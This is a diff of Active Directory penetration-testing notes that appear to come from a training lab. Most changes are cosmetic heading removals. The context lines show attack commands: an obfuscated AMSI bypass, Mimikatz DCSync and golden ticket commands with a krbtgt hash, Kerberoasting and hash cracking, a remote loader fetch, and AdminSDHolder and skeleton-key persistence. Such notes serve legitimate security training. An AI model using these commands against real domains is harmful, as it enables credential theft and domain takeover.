@@ -178,7 +178,6 @@ S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{
 <details>
 <summary>DOMAIN ACL ENUMERATION</summary>
 <b>DESCRIPTION:</b>
-<b> -ACL- </b>
 
 <b>::: ENUMERATE ACL FOR DOMAIN ADMIN GROUP</b>
 
@@ -219,7 +218,6 @@ note: ?{$_. = means find everything
 <details>
 <summary>DOMAIN COMPUTER ENUMERATION</summary>
 <b>DESCRIPTION:</b>
-<h3>DOMAIN COMPUTER ENUMERATION WITH POWERSHELL</h3>
 
 <b>:::GET A LIST OF COMPUTERS IN THE CURRENT DOMAIN</b>
 
@@ -236,7 +234,6 @@ PS> Get-ADComputer -Filter * -Properties DNSHostname | %{Test-Connection -Count 
 <details>
 <summary>DOMAIN FOREST ENUMERATION</summary>
 <b>DESCRIPTION:</b>
-<h3> DOMAIN FOREST ENUMERATION WITH POWERSHELL</h3>
 
 <b> -FOREST- </b>
 
@@ -273,7 +270,6 @@ PS> Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
 <details>
 <summary>DOMAIN GPO ENUMERATION</summary>
 <b>DESCRIPTION:</b>
-<h3> DOMAIN GPO ENUMERATION WITH POWERSHELL</h3>
 
 <b> -GPO- </b>
 
@@ -310,7 +306,6 @@ PS> (Get-DomainOU -Identity [OU]).gplink
 <details>
 <summary>DOMAIN TRUST ENUMERATION</summary>
 <b>DESCRIPTION:</b>
-<h3> DOMAIN TRUST ENUMERATION WITH POWERSHELL</h3>
 
 <b> -TRUSTS- </b>
 
@@ -379,7 +374,6 @@ PS> Get-ADTrust -Filter * -Server [xternalTrust]
 <details>
 <summary>DOMAIN USER ENUMERATION</summary>
 <b>DESCRIPTION:</b>
-<h3>DOMAIN ENUMERATION WITH POWERSHELL</h3>
 
 <b>:::GET LIST OF USER IN CURRENT DOMAIN</b>
 
@@ -431,7 +425,6 @@ PS> Get-DomainUser | select samaccountname,logoncount
 <details>
 <summary>DOMAIN ENUMERATION USERHUNTING</summary>
 <b>DESCRIPTION:</b>
-<h3> DOMAIN ENUMERATION - USER HUNTING </h3>
 
 <b>::: FIND ALL MACHINES ON THE CURRENT DOMAIN WHERE THE CURRENT USER HAS LOCAL ADMIN ACCESS</b>
 
@@ -466,7 +459,6 @@ PS> Find-DomainUserLocation -Stealth
 <details>
 <summary>DOMAIN GROUP MEMBERS ENUMERATION</summary>
 <b>DESCRIPTION:</b>
-<h3>DOMAIN GROUP/MEMBERS ENUMERATION WITH POWERSHELL</h3>
 
 <b>:::GET ALL GROUPS IN THE CURRENT DOMAIN</b>
 
@@ -530,15 +522,14 @@ PS> Get-DomainGroup *admin* -domain <forest/root> | select samaccountname
 <h4>POWERSHELL LATERAL MOVEMENT</h4>
 <details>
 <summary>DOMAIN LATERAL MOVEMENT</summary>
-<b></b>DESCRIPTION:
-<h3>LATERAL MOVEMENTS</h3>
+<b>DESCRIPTION:</b> 
 
 :: powershell remoting (PSRemoting)
 uses WinRM | ports: 5985 HTTP & 5986 HTTPS | required: "Enable-PSRemoting"
 
 - two types: 1:1 | 1:many
 
->>> 1:1
+>>> 1:1 
 
 PSSession: interactive | runs in a new process (wsmprovhost) | is stateful
 
@@ -555,7 +546,6 @@ PS> Invoke-Command
 <details>
 <summary>DOMAIN LATERAL MOVEMENT MIMIKATZ</summary>
 <b>DESCRIPTION:</b>
-<h3>LATERAL MOVEMENT - MIMIKATZ</h3>
 
 >> invoke-mimikatz
 
@@ -623,7 +613,6 @@ PS> SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
 <details>
 <summary>DOMAIN LATERAL MOVEMENT PSREMOTING</summary>
 <b>DESCRIPTION:</b>
-<h3>LATERAL MOVEMENT - PS REMOTING</h3>
 
 --POWERSHELL REMOTING--
 
@@ -661,7 +650,6 @@ PS> winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname
 <details>
 <summary>DOMAIN LOCAL PRIVESC</summary>
 <b>DESCRIPTION:</b>
-<h3>DOMAIN PRIVILEGE ESCALATION</h3>
 
 <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">PowerUp</a>
 
@@ -708,7 +696,6 @@ different permissons assigned.
 <details>
 <summary>DOMAIN PRIVESC KERBEROAST</summary>
 <b>DESCRIPTION:</b>
-<h3> PRIVESC - KERBEROAST </h3>
 
 <b>::: FIND USER ACCOUNTS USED AS "SERVICE ACCOUNTS"</b>
 
@@ -747,7 +734,6 @@ PS> john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\ha
 <details>
 <summary>DOMAIN PRIVESC KERBEROAST ASREPs</summary>
 <b>DESCRIPTION:</b>
-<h3> PRIVESC - KERBEROAST AS-REPs </h3>
 
 If a user's UserAccountControl settings have "Do not require Kerberos preauthentication" enabled i.e. 
 Kerberos preauth is disabled, it is possible to grab user's crackable AS-REP and brute-force it offline.
@@ -792,7 +778,6 @@ PS> john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\as
 <details>
 <summary>DOMAIN PRIVESC KERBEROAST SetPN</summary>
 <b>DESCRIPTION:</b>
-<h3> PRIVESC - KERBEROAST | Set-SPN </h3>
 
 - With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the domain).
 - We can then request a TGS without special privileges. The TGS can then be "Kerberoasted".
@@ -826,7 +811,6 @@ PS> john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\ta
 <details>
 <summary>DOMAIN PRIVESC KERBEROS DELEGATION</summary>
 <b>DESCRIPTION:</b>
-<h3> PRIVESC - KERBEROS DELEGATION </h3>
 
 allows to "reuse the end-user credentials to access resources hosted on a different server"
 
@@ -906,7 +890,7 @@ hop server, Windows offers Protocol Transition to transition the request to Kerb
 <details>
 <summary>DOMAIN OFFENSIVE.NET AV BYPASS</summary>
 <b>DESCRIPTION:</b>
-<h3> OFFENSIVE .NET - AV BYPASS: STRING MANIPULATION</h3>
+<b>STRING MANIPULATION</b>
 
 <a href="https://github.com/matterpreter/DefenderCheck">DEFENDER CHECK</a> can be used to detect code and 
 strings from a binary that windows defender may flag as malicious.
@@ -951,7 +935,6 @@ PS> C:\Users\Public\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http:
 <details>
 <summary>DOMAIN OU ENUMERATION</summary>
 <b>DESCRIPTION:</b>
-<h3> DOMAIN OU ENUMERATION WITH POWERSHELL </h3>
 
 <b>-OU-</b>
 
@@ -993,8 +976,8 @@ Resides in the System container of a domain and used to control the permissions
 Account Operators | Enterprise Admins | Domain Controllers | Backup Operators | Administrators
 Print Operators | Schema Admins | Replicator | Read-Only Domain Controller
 
-Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder
-and any differences are overwritten on the object ACL.
+Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the 
+ACL of AdminSDHolder and any differences are overwritten on the object ACL.
 
 <b>::: ACCOUNTS THAT CAN BE ABUSSED</b>
 
@@ -1003,9 +986,11 @@ and any differences are overwritten on the object ACL.
 - Server Operators: Run a command as system (using the disabled Browser service)
 - PrintOperators: Copy ntds.dit backup, load device drivers.
 
->> With DA privileges (Full Control/Write permissions) on the AdminSDHolder object, it can be used as a backdoor/persistence mechanism
-by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object. 
->> In 60 minutes (when SDPROP runs), the user will be added with Full Control to the AC of groups like Domain Admins without actually being a member of it.
+>> With DA privileges (Full Control/Write permissions) on the AdminSDHolder object, it can be used as a 
+backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to 
+the AdminSDHolder object. 
+>> In 60 minutes (when SDPROP runs), the user will be added with Full Control to the AC of groups like Domain Admins 
+without actually being a member of it.
 
 <b>::: ADD FULLCONTROL PERMISSIONS FOR A USER TO THE AdminSDHolder USING POWERVIEW AS DA</b>
 
@@ -1062,9 +1047,9 @@ PS> Set-ADAccountPassword -Identity testda -NewPassword(ConvertTo-SecureString "
 <details>
 <summary>DOMAIN PERSISTENCE ACL RIGHTS ABUSE</summary>
 <b>DESCRIPTION:</b>
-<h3> PERSISTENCE - RIGHTS ABUSE </h3>
 
-With DA privileges, the ACL for the domain root can be modified to provide useful rights like FullControl or the ability to run "DCSync".
+With DA privileges, the ACL for the domain root can be modified to provide useful rights like FullControl or the ability to run 
+"DCSync".
 
 <b>::: ADD FULL CONTROL RIGHTS</b>
 
@@ -1096,7 +1081,6 @@ PS> C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 <details>
 <summary>DOMAIN PERSISTENCE ACL SECURITY DESCRIPTORS</summary>
 <b>DESCRIPTION: </b>
-<h3> PERSISTENCE - SECURITY DESCRIPTORS </h3>
 
 >> Security Descriptor Definition Language defines the format which is used to describe a security descriptor. 
 SDDL uses ACE strings for DACL and SACL:
@@ -1165,7 +1149,6 @@ PS> Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
 <details>
 <summary>DOMAIN PERSISTENCE CUSTOMSSP</summary>
 <b>DESCRIPTION:</b>
-<h3> PERSISTENCE - CUSTOM SSP </h3>
 
 "is a DLL which provides ways for an application to obtain an authenticated connection"
 
@@ -1195,7 +1178,6 @@ NOTE: local logons are logged on the following file <b>C:\Windows\system32\kiwis
 <details>
 <summary>DOMAIN PERSISTENCE DSMR</summary>
 <b>DESCRIPTION: </b>
-<h3> PERSISTENCE - DSMR </h3>
 
 "Directory Services Restore Mode"
 
@@ -1228,7 +1210,6 @@ PS> ls \\dcorp-dc\C$
 <details>
 <summary>DOMAIN PERSISTENCE GOLDEN</summary>
 <b>DESCRIPTION: </b>
-<h3> PERSISTENCE - GOLDEN TICKET</h3>
 
 <b>::: GET KRBTGT HASH</b>
 
@@ -1241,7 +1222,7 @@ PS> Invoke-Mimikatz -Command '"lsadump::lsa /patch"' –Computername dcorp-dc
 PS> Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 
 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 
-Page 130
+Page 130...
 
 <b>::: USING DSYNC</b>
 
@@ -1254,7 +1235,6 @@ PS> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 <details>
 <summary>DOMAIN PERSISTENCE SILVER</summary>
 <b>DESCRIPTION:</b>
-<h3> PERSISTENCE - SILVER TICKET</h3>
 
 A valid TGS (Golden ticket is TGT).
 Encrypted and signed by the hash of the service account (golden ticket is signed by hash of krbtgt) of the service running with that account.
@@ -1285,7 +1265,6 @@ PS> schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"
 <details>
 <summary>DOMAIN PERSISTENCE SKELETON KEY</summary>
 <b>DESCRIPTION:</b>
-<h3> PERSISTENCE - SKELETON-KEY </h3>
 
 Skeleton key is a persistence technique where it is possible to patch a Domain Controller (lsassprocess) 
 so that it allows access as any user with a single password.
@@ -1302,7 +1281,6 @@ PS> Enter-PSSession –Computername dcorp-dc –credential dcorp\Administrator
 <details>
 <summary>REMOTE CONNECTION</summary>
 <b>DESCRIPTION:</b>
-<h3> REMOTE CONNECTION USING POWERSHELL </h3>
 
 <b>:::CONNECT TO A REMOTE MACHINE USING WINRS</b>
 
